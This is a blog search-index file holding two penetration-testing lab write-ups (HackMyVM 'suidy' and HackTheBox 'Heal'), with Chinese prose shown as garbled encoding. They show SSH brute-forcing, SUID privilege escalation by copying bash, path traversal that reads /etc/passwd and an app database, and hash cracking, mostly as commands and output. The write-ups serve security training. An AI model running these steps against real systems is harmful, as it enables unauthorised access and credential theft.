{"meta":{"title":"lvzhouhang","subtitle":"","description":"","author":"lvzhouhang","url":"https://lvzhouhang.xyz","root":"/"},"pages":[{"title":"æ–‡ç« åˆ†ç±»","date":"2023-01-01T07:04:00.000Z","updated":"2023-01-01T07:20:11.000Z","comments":true,"path":"categories/index.html","permalink":"https://lvzhouhang.xyz/categories/index.html","excerpt":"","text":""},{"title":"æ–‡ç« æ ‡ç­¾","date":"2023-01-01T07:07:09.000Z","updated":"2023-01-01T07:20:24.217Z","comments":true,"path":"tags/index.html","permalink":"https://lvzhouhang.xyz/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2025-04-19T10:46:40.000Z","updated":"2025-04-19T10:47:17.347Z","comments":true,"path":"about/index.html","permalink":"https://lvzhouhang.xyz/about/index.html","excerpt":"","text":"try my best to be better!!!"}],"posts":[{"title":"HackmyVM-suidy","slug":"HackmyVM-suidy","date":"2025-05-10T13:08:18.000Z","updated":"2025-05-10T13:57:44.008Z","comments":true,"path":"2025/05/10/HackmyVM-suidy/","permalink":"https://lvzhouhang.xyz/2025/05/10/HackmyVM-suidy/","excerpt":"","text":"ä¿¡æ¯æœé›†1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:de:a5:1f PCS Systemtechnik GmbH192.168.31.181 08:00:27:86:a5:04 PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.442 seconds (104.83 hosts/sec). 3 respondedâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# rustscan -a 192.168.31.181 -r 1-65535.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog :: https://github.com/RustScan/RustScan : --------------------------------------Breaking and entering... into the world of open ports.[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.181:22Open 192.168.31.181:80[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 09:10 EDTInitiating ARP Ping Scan at 09:10Scanning 192.168.31.181 [1 port]Completed ARP Ping Scan at 09:10, 0.09s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 09:10Completed Parallel DNS resolution of 1 host. at 09:10, 0.02s elapsedDNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 09:10Scanning 192.168.31.181 [2 ports]Discovered open port 22/tcp on 192.168.31.181Discovered open port 80/tcp on 192.168.31.181Completed SYN Stealth Scan at 09:10, 0.03s elapsed (2 total ports)Nmap scan report for 192.168.31.181Host is up, received arp-response (0.00051s latency).Scanned at 2025-05-10 09:10:36 EDT for 0sPORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6480/tcp open http syn-ack ttl 64MAC Address: 08:00:27:86:A5:04 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.29 seconds Raw packets sent: 3 (116B) | Rcvd: 3 (116B) å¤–éƒ¨æ‰“ç‚¹ç›®å½•çˆ†ç ´123456789101112131415161718192021222324â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.181/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php,.html===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.181/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: txt,php,html[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/index.html (Status: 200) [Size: 22]/robots.txt (Status: 200) [Size: 362]Progress: 882236 / 882240 (100.00%)===============================================================Finished=============================================================== robots.txté‡Œæœ‰ä¸€ä¸ªæ‘©æ–¯å¯†ç ï¼Œè§£ç ä¹‹åæ˜¯HIAGAIN è¿˜æœ‰ä¸€ä¸ªè—åœ¨æœ€ä¸‹é¢çš„å¾ˆå°å¾ˆå°çš„ä¸€ä¸ªç›®å½•/shehatesme 12She hates me because I FOUND THE REAL SECRET! I put in this directory a lot of .txt files. ONE of .txt files contains credentials like &quot;theuser/thepass&quot; to access to her system! All that you need is an small dict from Seclist!å¥¹æ¨æˆ‘ï¼Œå› ä¸ºæˆ‘å‘ç°äº†çœŸæ­£çš„ç§˜å¯†ï¼æˆ‘åœ¨è¿™ä¸ªç›®å½•ä¸­æ”¾äº†å¾ˆå¤š .txt æ–‡ä»¶ã€‚.txt ä¸ªæ–‡ä»¶ä¹‹ä¸€åŒ…å«è®¿é—®å¥¹çš„ç³»ç»Ÿçš„å‡­æ®ï¼Œä¾‹å¦‚ â€œtheuser/thepassâ€ï¼æ‚¨åªéœ€è¦ Seclist ä¸­çš„ä¸€ä¸ªå° dictï¼ ç»§ç»­çˆ†ç ´ç›®å½• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.181/shehatesme/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.181/shehatesme/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: txt[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/full.txt (Status: 200) [Size: 16]/about.txt (Status: 200) [Size: 16]/search.txt (Status: 200) [Size: 16]/privacy.txt (Status: 200) [Size: 16]/blog.txt (Status: 200) [Size: 16]/new.txt (Status: 200) [Size: 16]/page.txt (Status: 200) [Size: 16]/forums.txt (Status: 200) [Size: 16]/jobs.txt (Status: 200) [Size: 16]/other.txt (Status: 200) [Size: 16]/welcome.txt (Status: 200) [Size: 16]/admin.txt (Status: 200) [Size: 16]/faqs.txt (Status: 200) [Size: 16]/2001.txt (Status: 200) [Size: 16]/link.txt (Status: 200) [Size: 16]/space.txt (Status: 200) [Size: 16]/network.txt (Status: 200) [Size: 16]/google.txt (Status: 200) [Size: 16]/folder.txt (Status: 200) [Size: 16]/java.txt (Status: 200) [Size: 16]/issues.txt (Status: 200) [Size: 16]/guide.txt (Status: 200) [Size: 16]/es.txt (Status: 200) [Size: 16]/art.txt (Status: 200) [Size: 16]/smilies.txt (Status: 200) [Size: 16]/airport.txt (Status: 200) [Size: 16]/secret.txt (Status: 200) [Size: 16]/procps.txt (Status: 200) [Size: 16]/pynfo.txt (Status: 200) [Size: 16]/lh2.txt (Status: 200) [Size: 16]/muze.txt (Status: 200) [Size: 16]/alba.txt (Status: 200) [Size: 16]/cymru.txt (Status: 200) [Size: 16]/wha.txt (Status: 200) [Size: 16] ç„¶åæ•´ç†ä¸€ä¸‹ä¿å­˜ä¸‹æ¥ 1234567891011121314151617181920212223242526272829303132333435363738â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# grep &#x27;.*\\.txt&#x27; pass -o&gt;pass.txtâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# for i in $(cat pass.txt);do curl &quot;http://192.168.31.181/shehatesme$i&quot;;doneyuijhse/hjupnkkjaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6hidden1/passZZ!jhfbvgt/iugbnvhjohn765/FDrhguymaria11/jhfgyRfjaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6mmnnbbv/iughtyrjaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6smileys/98GHbjhnhvjguy/kjhgyutjaime11/JKiufg6theuser/thepassjaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6jaime11/JKiufg6 sshç™»å½•1234â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; 2 &gt;&gt;userâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# awk -F&#x27;/&#x27; &#x27;&#123;print $2&#125;&#x27; 2 &gt;&gt;pass.txt 123456789101112131415â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# hydra -C 3 192.168.31.181 ssh -vV -f -IHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-10 09:30:22[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries, ~3 tries per task[DATA] attacking ssh://192.168.31.181:22/[VERBOSE] Resolving addresses ... [VERBOSE] resolving done....[22][ssh] host: 192.168.31.181 login: theuser password: thepass[STATUS] attack finished for 192.168.31.181 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-10 09:30:26 theuser:thepassç™»å½• ææƒROOT12theuser@suidy:~$ sudo -l-bash: sudo: orden no encontrada sudoæ²¡æœ‰ä¸œè¥¿ 12345678910111213theuser@suidy:~$ find / -perm -u=s 2&gt;/dev/null/home/suidy/suidyyyyy/usr/bin/su/usr/bin/umount/usr/bin/mount/usr/bin/gpasswd/usr/bin/chfn/usr/bin/newgrp/usr/bin/passwd/usr/bin/chsh/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device suidæ‰¾åˆ°äº†ä¸€ä¸ªsuidyyyyyæ‰§è¡Œç›´æ¥è·å¾—suidyçš„æƒé™,æŸ¥çœ‹æƒé™ 1234theuser@suidy:/home/suidy$ ls -lltotal 24-r--r----- 1 suidy suidy 197 sep 26 2020 note.txt-rwsrwsr-x 1 root theuser 16704 sep 26 2020 suidyyyyy idaæ‰“å¼€æŸ¥çœ‹ 1234567int __fastcall main(int argc, const char **argv, const char **envp)&#123; setuid(0x3E9u); setgid(0x3E9u); system(&quot;/bin/bash&quot;); return 0;&#125; ä¸Šä¼ ä¸€ä¸ªpspyç›‘æ§è¿›ç¨‹ 12025/05/10 15:52:01 CMD: UID=0 PID=711 | sh /root/timer.sh å“æœ‰ä¸€ä¸ªtimer.shï¼Œç›²çŒœä»–å¯èƒ½æ˜¯ç»™æˆ‘ä»¬ä¸Šä¼ çš„suidyyyyyåŠ suidæƒé™çš„ï¼Œéšä¾¿cpä¸€ä¸ªæ–‡ä»¶è¦†ç›–æ‰ï¼Œç„¶åç­‰ä¸€ä¼š 1234567891011121314151617181920212223242526272829303132theuser@suidy:/home/suidy$ cat suidyyyyyroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologintheuser:x:1000:1000:theuser,,,:/home/theuser:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinsuidy:x:1001:1001:,,,:/home/suidy:/bin/bashsshd:x:105:65534::/run/sshd:/usr/sbin/nologintheuser@suidy:/home/suidy$ ls -lltotal 8-r--r----- 1 suidy suidy 197 sep 26 2020 note.txt-rwsrwsr-x 1 root theuser 1445 may 10 15:53 suidyyyyy çŒœæƒ³æ˜¯æ­£ç¡®çš„ï¼Œå°†bashç»™cpè¿‡æ¥ 12345theuser@suidy:/home/suidy$ cp /bin/bash ./suidyyyyytheuser@suidy:/home/suidy$ ./suidyyyyy -psuidyyyyy-5.0#suidyyyyy-5.0# iduid=1000(theuser) gid=1000(theuser) euid=0(root) grupos=1000(theuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HTB-Heal","slug":"HTB-Heal","date":"2025-05-09T15:08:29.000Z","updated":"2025-05-09T16:12:03.834Z","comments":true,"path":"2025/05/09/HTB-Heal/","permalink":"https://lvzhouhang.xyz/2025/05/09/HTB-Heal/","excerpt":"","text":"ä¿¡æ¯æœé›†ç«¯å£æ¢æµ‹1234567891011121314151617181920212223242526272829303132333435363738394041â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# rustscan -a 10.10.11.46 -r 1-65535.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog :: https://github.com/RustScan/RustScan : --------------------------------------Scanning ports like it&#x27;s my full-time job. Wait, it is.[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 10.10.11.46:22Open 10.10.11.46:80[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 11:08 EDTInitiating Ping Scan at 11:08Scanning 10.10.11.46 [4 ports]Completed Ping Scan at 11:08, 0.49s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 11:08Completed Parallel DNS resolution of 1 host. at 11:08, 0.03s elapsedDNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 11:08Scanning 10.10.11.46 [2 ports]Discovered open port 80/tcp on 10.10.11.46Discovered open port 22/tcp on 10.10.11.46Completed SYN Stealth Scan at 11:08, 0.24s elapsed (2 total ports)Nmap scan report for 10.10.11.46Host is up, received echo-reply ttl 63 (0.36s latency).Scanned at 2025-05-09 11:08:30 EDT for 1sPORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 1.02 seconds Raw packets sent: 6 (240B) | Rcvd: 1459 (58.356KB) å¼€å¯äº†80ç«¯å£å’Œ22ç«¯å£ å­åŸŸåæšä¸¾è®¿é—®80ç«¯å£ä¼šè‡ªåŠ¨è·³è½¬heal.htb,æ·»åŠ hostsï¼Œæšä¸¾å­åŸŸåæšä¸¾å‡ºæ¥ä¸€ä¸ªapi 12345678910111213141516â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw 12 -u &quot;http://10.10.11.46&quot; -H &quot;Host: FUZZ.heal.htb&quot; /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.11.46/Total requests: 220559=====================================================================ID Response Lines Word Chars Payload=====================================================================000001026: 200 90 L 186 W 12515 Ch &quot;api&quot; å°†apiä¹Ÿæ·»åŠ è¿›hosts å¤–éƒ¨æ‰“ç‚¹ä»»æ„æ–‡ä»¶è¯»å– æ³¨å†Œè¿‡åæ˜¯ä¸€ä¸ªç®€å†ç”Ÿæˆå™¨ï¼Œå¡«å¥½ä¹‹åç”ŸæˆæŠ“åŒ…ï¼Œå¯ä»¥æŠ“åˆ°ä¸€ä¸ªdownloadçš„è·¯ç”± 12345678910GET /download?filename=cd966abb8c424272f040.pdf HTTP/1.1Host: api.heal.htbUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0fQ.J0NnCAdf82F0IukEy8HTIUHK49VpBnwHhtd4hBp-Y_wOrigin: http://heal.htbConnection: keep-aliveReferer: http://heal.htb/ å°†filenameæ”¹ä¸º/download?filename=/etc/passwd 123456789101112131415161718192021222324252627282930313233343536373839root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:104::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinpollinate:x:105:1::/var/cache/pollinate:/bin/falsesshd:x:106:65534::/run/sshd:/usr/sbin/nologinsyslog:x:107:113::/home/syslog:/usr/sbin/nologinuuidd:x:108:114::/run/uuidd:/usr/sbin/nologintcpdump:x:109:115::/nonexistent:/usr/sbin/nologintss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/falselandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologinfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinusbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinralph:x:1000:1000:ralph:/home/ralph:/bin/bashlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/falseavahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologingeoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologinpostgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash_laurel:x:998:998::/var/log/laurel:/bin/falseron:x:1001:1001:,,,:/home/ron:/bin/bash å¯ä»¥çŸ¥é“æœ‰ä¸€ä¸ªronçš„ç”¨æˆ· api.heal.htbæ˜¯ä¸€ä¸ªruby on railsç‰ˆæœ¬å·æ˜¯7.1.4ï¼Œé€šè¿‡æŸ¥çœ‹æ‰‹å†Œå¯ä»¥çŸ¥é“é…ç½®æ–‡ä»¶ä¸º/config/environments/production.rbå¯ä»¥è¯»å–åˆ° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091/download?filename=../../config/environments/production.rbrequire &quot;active_support/core_ext/integer/time&quot;Rails.application.configure do # Settings specified here will take precedence over those in config/application.rb. # Code is not reloaded between requests. config.enable_reloading = false # Eager load code on boot. This eager loads most of Rails and # your application in memory, allowing both threaded web servers # and those relying on copy on write to perform better. # Rake tasks automatically ignore this option for performance. config.eager_load = true config.hosts &lt;&lt; &quot;api.heal.htb&quot; # Full error reports are disabled and caching is turned on. config.consider_all_requests_local = false # Ensures that a master key has been made available in ENV[&quot;RAILS_MASTER_KEY&quot;], config/master.key, or an environment # key such as config/credentials/production.key. This key is used to decrypt credentials (and other encrypted files). # config.require_master_key = true # Disable serving static files from `public/`, relying on NGINX/Apache to do so instead. # config.public_file_server.enabled = false # Enable serving of images, stylesheets, and JavaScripts from an asset server. # config.asset_host = &quot;http://assets.example.com&quot; # Specifies the header that your server uses for sending files. # config.action_dispatch.x_sendfile_header = &quot;X-Sendfile&quot; # for Apache # config.action_dispatch.x_sendfile_header = &quot;X-Accel-Redirect&quot; # for NGINX # Store uploaded files on the local file system (see config/storage.yml for options). config.active_storage.service = :local # Mount Action Cable outside main process or domain. # config.action_cable.mount_path = nil # config.action_cable.url = &quot;wss://example.com/cable&quot; # config.action_cable.allowed_request_origins = [ &quot;http://example.com&quot;, /http:\\/\\/example.*/ ] # Assume all access to the app is happening through a SSL-terminating reverse proxy. # Can be used together with config.force_ssl for Strict-Transport-Security and secure cookies. # config.assume_ssl = true # Force all access to the app over SSL, use Strict-Transport-Security, and use secure cookies. config.force_ssl = false # Log to STDOUT by default config.logger = ActiveSupport::Logger.new(STDOUT) .tap &#123; |logger| logger.formatter = ::Logger::Formatter.new &#125; .then &#123; |logger| ActiveSupport::TaggedLogging.new(logger) &#125; # Prepend all log lines with the following tags. config.log_tags = [ :request_id ] # &quot;info&quot; includes generic and useful information about system operation, but avoids logging too much # information to avoid inadvertent exposure of personally identifiable information (PII). If you # want to log everything, set the level to &quot;debug&quot;. config.log_level = ENV.fetch(&quot;RAILS_LOG_LEVEL&quot;, &quot;info&quot;) # Use a different cache store in production. # config.cache_store = :mem_cache_store # Use a real queuing backend for Active Job (and separate queues per environment). # config.active_job.queue_adapter = :resque # config.active_job.queue_name_prefix = &quot;resume_api_production&quot; config.action_mailer.perform_caching = false # Ignore bad email addresses and do not raise email delivery errors. # Set this to true and configure the email server for immediate delivery to raise delivery errors. # config.action_mailer.raise_delivery_errors = false # Enable locale fallbacks for I18n (makes lookups for any locale fall back to # the I18n.default_locale when a translation cannot be found). config.i18n.fallbacks = true # Don&#x27;t log any deprecations. config.active_support.report_deprecations = false # Do not dump schema after migrations. config.active_record.dump_schema_after_migration = false # Enable DNS rebinding protection and other `Host` header attacks. # config.hosts = [ # &quot;example.com&quot;, # Allow requests from example.com # /.*\\.example\\.com/ # Allow requests from subdomains like `www.example.com` # ] # Skip DNS rebinding protection for the default health check endpoint. # config.host_authorization = &#123; exclude: -&gt;(request) &#123; request.path == &quot;/up&quot; &#125; &#125;end ç»§ç»­ç¿»ä¸€ç¿»å¯ä»¥ç¿»åˆ°æ•°æ®åº“çš„è·¯å¾„ä¸ºconfig/database.yml 12345678910111213141516171819202122232425262728/download?filename=../../config/database.yml# SQLite. Versions 3.8.0 and up are supported.# gem install sqlite3## Ensure the SQLite 3 gem is defined in your Gemfile# gem &quot;sqlite3&quot;#default: &amp;default adapter: sqlite3 pool: &lt;%= ENV.fetch(&quot;RAILS_MAX_THREADS&quot;) &#123; 5 &#125; %&gt; timeout: 5000development: &lt;&lt;: *default database: storage/development.sqlite3# Warning: The database defined as &quot;test&quot; will be erased and# re-generated from your development database when you run &quot;rake&quot;.# Do not set this db to the same as development or production.test: &lt;&lt;: *default database: storage/test.sqlite3production: &lt;&lt;: *default database: storage/development.sqlite3 æœ‰äº†æ•°æ®åº“æ–‡ä»¶çš„è·¯å¾„å°†ä»–ä¸‹è½½ä¸‹æ¥ 1curl &#x27;http://api.heal.htb/download?filename=../../storage/development.sqlite3&#x27; -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0fQ.J0NnCAdf82F0IukEy8HTIUHK49VpBnwHhtd4hBp-Y_w&quot; -o de.sqlite3 ç„¶åç”¨navicatè¿æ¥ ç”¨johnçˆ†ç ´å¯†ç  12345678â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# john pass -w=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 4 password hashes with 4 different salts (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 4096 for all loaded hashesWill run 8 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status147258369 (?) ç¬¬ä¸€ä¸ªralph@heal.htbçš„å¯†ç è¢«çˆ†ç ´å‡ºæ¥äº†ï¼Œä½†æ˜¯sshå¯†ç ä¸æ­£ç¡®ï¼Œç»§ç»­ç¿»ä¸€ç¿»web webé¡µé¢è¿˜æœ‰ä¸€ä¸ª/survey,è®¿é—®ç‚¹å‡»ä¹‹åä¼šè°ƒæ•´take-survey.heal.htbåŠ å…¥hosts ç›®å½•çˆ†ç ´æ‰«æç›®å½• 123456789101112131415161718192021â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# dirsearch -u &quot;http://take-survey.heal.htb/index.php/&quot; -x 503/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460Output File: /root/Desktop/tmp/tmp/reports/http_take-survey.heal.htb/_index.php__25-05-09_11-45-08.txtTarget: http://take-survey.heal.htb/[11:45:08] Starting: index.php/ã€‚ã€‚ã€‚ã€‚ã€‚[11:46:50] 302 - 0B - /index.php/Admin -&gt; http://take-survey.heal.htb/index.php/admin/authentication/sa/login[11:46:54] 302 - 0B - /index.php/Admin/ -&gt; http://take-survey.heal.htb/index.php/admin/authentication/sa/login[11:46:54] 302 - 0B - /index.php/admin/%3bindex/ -&gt; http://take-survey.heal.htb/index.php/admin/authentication/sa/login[11:46:54] 302 - 0B - /index.php/admin/_logs/access-log -&gt; http://take-survey.heal.htb/index.php/admin/authentication/sa/loginã€‚ã€‚ã€‚ å¯ä»¥çœ‹åˆ°å¾ˆå¤šéƒ½ä¼š302è·³è½¬åˆ°http://take-survey.heal.htb/index.php/admin/authentication/sa/login RCEè®¿é—®ä¸€ä¸‹çœ‹çœ‹ï¼Œæ˜¯ä¸€ä¸ªç™»å½•çš„åœ°æ–¹ï¼Œç”¨çˆ†ç ´å‡ºæ¥çš„å¯†ç ç™»é™†ä¸€ä¸‹ 1ralph:147258369 